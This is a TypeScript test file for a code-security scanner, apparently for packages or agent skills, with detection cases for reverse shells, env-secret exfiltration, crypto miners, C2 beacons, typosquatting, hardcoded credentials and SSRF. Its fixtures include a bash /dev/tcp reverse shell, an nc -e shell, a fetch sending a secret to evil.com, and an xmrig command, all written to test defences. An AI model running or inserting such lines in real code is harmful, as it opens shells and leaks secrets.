import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { obfuscationRule } from "../src/rules/obfuscation.js";
import { envLeakRule } from "../src/rules/env-leak.js";
import { cryptoMiningRule } from "../src/rules/crypto-mining.js";
import { reverseShellRule } from "../src/rules/reverse-shell.js";
import { typosquattingRule } from "../src/rules/typosquatting.js";
import { hiddenFilesRule } from "../src/rules/hidden-files.js";
import { excessivePermsRule } from "../src/rules/excessive-perms.js";
import { phoneHomeRule } from "../src/rules/phone-home.js";
import { credentialHardcodeRule } from "../src/rules/credential-hardcode.js";
import { networkSsrfRule } from "../src/rules/network-ssrf.js";
import type { ScannedFile } from "../src/types.js";

function makeFile(relativePath: string, content: string): ScannedFile {
  const ext = "." + relativePath.split(".").pop()!;
  return { path: `/fake/${relativePath}`, relativePath, content, lines: content.split("\n"), ext };
}

// obfuscation
describe("obfuscation", () => {
  it("detects String.fromCharCode with many args", () => {
    const f = makeFile("evil.js", `const s = String.fromCharCode(72,101,108,108,111);`);
    const findings = obfuscationRule.run([f]);
    assert.ok(findings.length > 0);
  });

  it("does NOT flag simple fromCharCode", () => {
    const f = makeFile("safe.js", `const col = String.fromCharCode(65 + n % 26);`);
    const findings = obfuscationRule.run([f]);
    assert.equal(findings.length, 0);
  });

  it("does NOT flag normal code", () => {
    const f = makeFile("safe.js", `const x = "hello world";`);
    const findings = obfuscationRule.run([f]);
    assert.equal(findings.length, 0);
  });
});

// env-leak
describe("env-leak", () => {
  it("detects process.env + fetch", () => {
    const f = makeFile("leak.ts", [
      `const token = process.env.SECRET_KEY;`,
      `fetch("https://evil.com", { body: token });`,
    ].join("\n"));
    const findings = envLeakRule.run([f]);
    assert.ok(findings.some((f) => f.severity === "medium"));
  });

  it("does NOT flag env access without HTTP", () => {
    const f = makeFile("safe.ts", `const port = process.env.PORT || 3000;`);
    const findings = envLeakRule.run([f]);
    assert.equal(findings.length, 0);
  });
});

// crypto-mining
describe("crypto-mining", () => {
  it("detects stratum protocol", () => {
    const f = makeFile("miner.js", `const pool = "stratum+tcp://pool.example.com:3333";`);
    const findings = cryptoMiningRule.run([f]);
    assert.ok(findings.some((f) => f.severity === "high"));
  });

  it("detects xmrig reference", () => {
    const f = makeFile("mine.sh", `./xmrig --pool pool.com --wallet abc`);
    const findings = cryptoMiningRule.run([f]);
    assert.ok(findings.length > 0);
  });

  it("does NOT flag normal crypto usage", () => {
    const f = makeFile("hash.js", `const hash = crypto.createHash("sha256").update(data).digest("hex");`);
    const findings = cryptoMiningRule.run([f]);
    assert.equal(findings.length, 0);
  });
});

// reverse-shell
describe("reverse-shell", () => {
  it("detects bash reverse shell", () => {
    const f = makeFile("evil.sh", `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`);
    const findings = reverseShellRule.run([f]);
    assert.ok(findings.some((f) => f.severity === "high"));
  });

  it("detects netcat reverse shell", () => {
    const f = makeFile("evil.sh", `nc -e /bin/sh 10.0.0.1 4444`);
    const findings = reverseShellRule.run([f]);
    assert.ok(findings.length > 0);
  });

  it("does NOT flag normal networking", () => {
    const f = makeFile("server.js", `const server = http.createServer();`);
    const findings = reverseShellRule.run([f]);
    assert.equal(findings.length, 0);
  });
});

// typosquatting
describe("typosquatting", () => {
  it("detects typosquatted lodash", () => {
    const f = makeFile("package.json", `{"dependencies": {"1odash": "^4.0.0"}}`);
    const findings = typosquattingRule.run([f]);
    assert.ok(findings.some((f) => f.severity === "low"));
  });

  it("does NOT flag legitimate packages", () => {
    const f = makeFile("package.json", `{"dependencies": {"lodash": "^4.0.0", "express": "^4.0.0"}}`);
    const findings = typosquattingRule.run([f]);
    assert.equal(findings.length, 0);
  });
});

// hidden-files
describe("hidden-files", () => {
  it("detects .env file", () => {
    const f = makeFile(".env", `API_KEY=sk-1234567890abcdef`);
    // Need to adjust ext for dotfiles
    f.ext = "";
    const findings = hiddenFilesRule.run([f]);
    assert.ok(findings.some((f) => f.message.includes("Environment file")));
  });

  it("does NOT flag normal files", () => {
    const f = makeFile("config.ts", `export const port = 3000;`);
    const findings = hiddenFilesRule.run([f]);
    assert.equal(findings.length, 0);
  });
});

// excessive-perms
describe("excessive-perms", () => {
  it("flags dangerous permissions", () => {
    const f = makeFile("SKILL.md", [
      "---",
      "name: danger",
      "permissions:",
      "  - exec",
      "  - admin",
      "  - root",
      "---",
    ].join("\n"));
    const findings = excessivePermsRule.run([f]);
    assert.ok(findings.some((f) => f.message.includes("dangerous")));
  });

  it("flags too many permissions", () => {
    const f = makeFile("SKILL.md", [
      "---",
      "name: greedy",
      "permissions:",
      "  - read",
      "  - write",
      "  - exec",
      "  - browser",
      "  - network",
      "  - admin",
      "---",
    ].join("\n"));
    const findings = excessivePermsRule.run([f]);
    assert.ok(findings.some((f) => f.message.includes("permissions")));
  });

  it("does NOT flag reasonable permissions", () => {
    const f = makeFile("SKILL.md", [
      "---",
      "name: safe",
      "permissions:",
      "  - read",
      "---",
    ].join("\n"));
    const findings = excessivePermsRule.run([f]);
    assert.equal(findings.length, 0);
  });
});

// phone-home
describe("phone-home", () => {
  it("detects setInterval + fetch", () => {
    const f = makeFile("beacon.js", [
      `setInterval(() => {`,
      `  fetch("https://c2.example.com/heartbeat");`,
      `}, 60000);`,
    ].join("\n"));
    const findings = phoneHomeRule.run([f]);
    assert.ok(findings.length > 0);
  });

  it("does NOT flag fetch without timer", () => {
    const f = makeFile("api.js", `fetch("https://api.example.com/data");`);
    const findings = phoneHomeRule.run([f]);
    assert.equal(findings.length, 0);
  });
});

// credential-hardcode
describe("credential-hardcode", () => {
  it("detects AWS access key", () => {
    const f = makeFile("config.js", `const key = "AKIAIOSFODNN7EXAMPLE";`);
    const findings = credentialHardcodeRule.run([f]);
    assert.ok(findings.some((f) => f.message.includes("AWS")));
  });

  it("detects GitHub PAT", () => {
    const f = makeFile("config.js", `const token = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";`);
    const findings = credentialHardcodeRule.run([f]);
    assert.ok(findings.some((f) => f.message.includes("GitHub")));
  });

  it("detects private key block", () => {
    const f = makeFile("key.ts", `const pk = "-----BEGIN RSA PRIVATE KEY-----";`);
    const findings = credentialHardcodeRule.run([f]);
    assert.ok(findings.some((f) => f.message.includes("private key")));
  });

  it("does NOT flag normal strings", () => {
    const f = makeFile("safe.js", `const greeting = "hello world";`);
    const findings = credentialHardcodeRule.run([f]);
    assert.equal(findings.length, 0);
  });
});

// network-ssrf
describe("network-ssrf", () => {
  it("detects AWS metadata endpoint", () => {
    const f = makeFile("ssrf.js", `fetch("http://169.254.169.254/latest/meta-data/");`);
    const findings = networkSsrfRule.run([f]);
    assert.ok(findings.some((f) => f.severity === "medium"));
  });

  it("detects fetch from req params", () => {
    const f = makeFile("proxy.js", `const data = await fetch(req.query.url);`);
    const findings = networkSsrfRule.run([f]);
    assert.ok(findings.length > 0);
  });

  it("does NOT flag static fetch URLs", () => {
    const f = makeFile("api.js", `fetch("https://api.example.com/v1/data");`);
    const findings = networkSsrfRule.run([f]);
    assert.equal(findings.length, 0);
  });
});
